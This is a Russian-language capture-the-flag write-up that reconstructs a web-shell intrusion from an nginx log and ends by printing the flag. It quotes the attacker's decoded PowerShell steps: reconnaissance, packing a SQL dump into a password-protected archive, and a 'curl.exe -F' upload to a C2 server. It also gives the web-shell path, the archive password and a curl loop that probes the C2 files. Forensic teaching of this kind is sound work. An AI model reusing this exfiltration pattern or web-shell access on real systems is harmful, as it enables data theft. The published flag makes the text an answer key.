# Не пойман — не медоед (HoneyLeak) — технический разбор

**Флаг:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
**Класс:** Log Forensics / Incident Response

## Краткое техническое резюме

В nginx access log из 56 873 records редкий User-Agent `Trident/6.0` встречается четыре раза. Requests
обращаются к ASPX web shell и содержат base64-encoded PowerShell commands для host reconnaissance,
создания password-protected ZIP из SQL dump и exfiltration на C2. Раздельное вычисление timestamp
формирует разные archive и upload paths, поэтому filename не является надёжным identifier. Artifact
определяется в open C2 directory по ZIP signature `PK\x03\x04` через HTTP Range requests; флаг
извлекается из таблицы `secrets`.

---

**Для воспроизведения:** Локальному solver нужны access log и скачанный ZIP (`--log`, `--blob`); оба отсутствуют в Git. Повторный поиск архива через `--probe-c2` дополнительно зависит от доступности учебного C2.

## 1. Контекст и цель

Исходный artifact — access log nginx:

```
honeyleak_access.log   56 873 строки   формат nginx "combined"   03/Jul/2026 15:00–22:59 UTC
```

Требуется восстановить attack timeline, найти exfiltrated database artifact и извлечь флаг.

Доступен только access log; server access и исходная database отсутствуют.

## 2. Разведка и поверхность атаки

- Формат nginx `combined`: source IP, timestamp, `"METHOD path HTTP/version"`, status code, response
  size, referrer и User-Agent.

- В логе присутствуют только `GET`, `HEAD` и `OPTIONS`; `POST` отсутствует. Initial compromise и
  размещение web shell произошли через канал, не представленный в access log.

- Traffic разделяется на две группы: около 12 IP с browser profile (стандартные UA,
  осмысленные пути `/api/news`, `/products`, `/about`) и ~12 IP со «сканерным» профилем — инструменты
  `masscan/sqlmap/ffuf/gobuster/feroxbuster/Wfuzz/dirsearch/DirBuster/Nmap NSE/python-requests/`
  `Go-http-client`, выполняющие enumeration paths к backups и dumps (`/orders.sql`,
  `/db_backup.sql`, `/phpMyAdmin-*/`, …), почти всё с ответами `403/404/405/500`.

- Команда `awk -F'"' '{print $6}' honeyleak_access.log | sort -u | wc -l` возвращает 27 уникальных
  User-Agent, что позволяет построить frequency distribution.

## 3. Анализ и проверка гипотез

- **URI-based detection.** Десятки IP запрашивают
  `*.sql`, `*.sqlite`, `*backup*`, `phpMyAdmin`; подавляющее большинство responses — `403/404`.
- Фильтрация только по database-related paths не выделяет атаку: эти URI доминируют в scanner noise и
  возвращают преимущественно `403/404`.
- **User-Agent frequency analysis.** Распределение вычисляется командой:
  `awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn`. 26 из 27 UA встречаются
  сотни-тысячи раз (сканеры + имитация браузеров + боты). И ровно **один** —
  `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` — встречается всего **4 раза**
  (`grep -c "Trident/6.0"` → 4). Этот UA является статистическим outlier.

- Все четыре requests имеют status `200`, source IP `185.193.88.77` и path, для которого остальные
  probes получают `403/404`. Тот же IP отправляет ещё 1162 scanner requests с другими UA.
- Сочетание редкого UA и scanner traffic с одного IP согласуется с гипотезой маскировки четырёх
  запросов среди шума. Один IP сам по себе не доказывает общего оператора или намеренную маскировку.
- `grep "185.193.88.77" ... | awk -F'"' '{print $3}' | awk '{print $1}' | sort | uniq -c` возвращает
  4×`200` и 1162 requests со status `301/302/403/404/405/500`.
- **Initial access path.** Четыре successful requests обращаются к
  `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64 PowerShell>`. Другие source IP проверяют
  `/aspnet_client/`, но не знают точного filename `healthcheck.aspx` и parameter `cmd`.

- **Execution timeline.** Base64 decoding `cmd=` для интервала 18:40:17–18:42:37 UTC даёт:
  host reconnaissance (`whoami && hostname && ipconfig`) → упаковка database
  `corp_finance_2026_07_03.sql` в архив с паролем (`7z.exe -pS7m!vQ2@rK9Lp4X_2026`) → загрузка на
  C2 `http://178.154.230.44/upload.php` через `curl.exe -F` → validation command
  (`curl ... | findstr blob_`).

- Пароль `S7m!vQ2@rK9Lp4X_2026` является ключом ZIP и не является флагом; целевой секрет хранится в SQL dump.
- Filename/timestamp correlation не идентифицирует artifact. Upload command выполнялась в 18:42:11
  с именем
  `blob_$ts.tmp`. C2 `http://178.154.230.44/` предоставляет open directory listing (`README.txt`:
  *«Public index mirror. Auto
  cleanup disabled.»*) из 1338 decoy-файлов `blob_*.{tmp,log,txt,bin,dat,cache}` — примерно по
  одному в минуту; они содержат random bytes без ZIP header. Object с timestamp 18:42 является decoy.

- **Timestamp inconsistency.** Шаг упаковки (18:41:05)
  вычисляет метку времени `$ts` **один раз** и пишет `blob_20260703_1841.tmp`. А шаг загрузки (18:42:11),
  **на 66 секунд позже**, — это *отдельный* запуск `powershell -c`, который **заново пересчитывает** `$ts`
  и обращается к `blob_20260703_1842.tmp`, который не был создан. `curl.exe -F
  "file=@<nonexistent path>"` завершается локально до передачи request body. Последующая validation
  `findstr /I blob_` даёт false positive, поскольку directory listing всегда содержит другие
  `blob_*` objects. Этот invocation не передал созданный archive.

- **Content-based identification.** ZIP archive, созданный `7z a -tzip`, начинается с signature
  `PK\x03\x04`. Первые четыре bytes каждого из 1338 objects
  запрашиваются через `Range: bytes=0-3`; совпадает один object:
  `blob_3po654ppbr.log` (12 МБ, prefix `504b0304`). Пароль из журнала открывает этот архив,
  а внутри находится ожидаемый SQL dump. Это связывает находку с заданием, но способ и момент
  её загрузки на C2 по четырём выделенным записям установить нельзя.

## 4. Выводы из артефактов

Реконструкция опирается на следующие findings:

1. Signature-based URI rules имеют низкую selectivity на фоне массового scanner traffic; сочетание
   rare User-Agent, successful status и unique path формирует более точный indicator.
2. Archive password является credential для доступа к artifact, а не целевым secret; флаг находится
   в SQL dump.
3. `$ts` вычисляется независимо в двух PowerShell invocations, поэтому pack и upload используют
   разные paths. Artifact идентифицируется по content signature, а не filename/timestamp.

## 5. Восстановление архива

1. Разобрать UA по частоте и найти единственный редкий выброс (4 попадания из 56 873):
   ```bash
   awk -F'"' '{print $6}' honeyleak_access.log | sort | uniq -c | sort -rn
   grep -c "Trident/6.0" honeyleak_access.log      # -> 4
   ```
2. Убедиться, что все 4 попадания с одного IP и с кодом `200` на уникальном пути:
   ```bash
   grep "Trident/6.0" honeyleak_access.log
   ```
3. Выполнить Base64 decode значений `cmd=` во всех 4 requests и восстановить path database, archive password и
   URL склада C2 (см. `recover_secret.py`, функция `analyze_log()`).
4. Получить C2 directory listing и определить ZIP archive по content signature:
   ```bash
   curl -s http://178.154.230.44/ | grep -o 'blob_[^"]*' > blobs.txt
   for b in $(cat blobs.txt); do
     magic=$(curl -s -r 0-3 "http://178.154.230.44/$b" | xxd -p)
     [ "$magic" = "504b0304" ] && echo "$b"
   done
   # -> blob_3po654ppbr.log
   curl -s http://178.154.230.44/blob_3po654ppbr.log -o real_blob.bin
   ```
5. Распаковать паролем из шага 3 и прочитать секрет:
   ```bash
   unzip -P 'S7m!vQ2@rK9Lp4X_2026' real_blob.bin
   cat corp_finance_2026_07_03.sql
   ```
   Флаг — в поле `secrets.incident_flag` внутри дампа.
6. Полный workflow воспроизводит `recover_secret.py` (см. §8): он разбирает лог, восстанавливает
   password/database path/C2 URL и либо выполняет повторный artifact search по ZIP signature
   (`--probe-c2`), либо использует уже скачанный `real_blob.bin`.

## 6. Флаг

```
avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}
```

## 7. Выводы и рекомендации

- **Behavioral anomaly detection.** Rare UA, unique successful path и status-code distribution
  предоставляют более точный signal, чем статические URI signatures.
- **Разделение credentials и payload.** Archive password обеспечивает доступ к artifact, но целевой
  indicator находится внутри SQL content.
- **Content-based artifact recovery.** Имя и время
  недостоверны из-за рассинхронизации timestamp; надёжным фильтром среди 1338 decoy files
  является signature `PK\x03\x04`, проверяемая через HTTP Range request. Filename и timestamp не
  используются как source of truth.
- **Валидация exfiltration.** Поиск произвольного `blob_*` в index даёт false positive. Проверка должна
  подтверждать конкретный object, размер, digest и expected format.

## 8. Файлы для воспроизведения

В репозитории:

- [`recover_secret.py`](recover_secret.py) — solver: разбирает `honeyleak_access.log`, декодирует
  web-shell commands, восстанавливает password/database path/C2 URL и при `--probe-c2` выполняет
  artifact search по ZIP signature. Флаг извлекается из таблицы `secrets` распакованного dump;
  default log path — `../honeyleak_access.log`.
- [`FLAG.txt`](FLAG.txt) — извлечённый флаг.

`honeyleak_access.log`, recovered ZIP artifact `real_blob.bin` и cached C2 index snapshots не входят
в набор файлов в Git. Для воспроизведения необходимо передать log через `--log` и archive
через `--blob` либо использовать `--probe-c2`, если C2 endpoint доступен.
